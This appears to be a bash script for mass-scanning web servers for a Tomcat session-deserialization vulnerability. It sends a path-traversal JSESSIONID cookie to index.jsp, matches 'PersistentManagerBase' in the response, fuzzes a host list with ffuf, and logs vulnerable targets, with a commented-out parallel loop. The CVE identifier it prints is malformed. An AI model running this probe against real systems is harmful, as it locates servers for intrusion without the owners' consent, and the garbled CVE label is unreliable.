#!/bin/bash
function a(){
curl --insecure --silent -X GET $1/index.jsp -H 'Cookie: JSESSIONID=../../../../../usr/local/tomcat/groovy' | grep -qs "PersistentManagerBase" && \printf "$1 \033[0;31mCVE-2020-948444\n" >> bbbb

}
ffuf -w $1 -u FUZZ/index.jsp -h 'Cookie: JSESSIONID=../../../../../usr/local/tomcat/groovy' -mr "PersistentManagerBase"
#cat  $1 | xargs -n 1 -P 50 -I {} bash -c  'a "$@"' _ {}
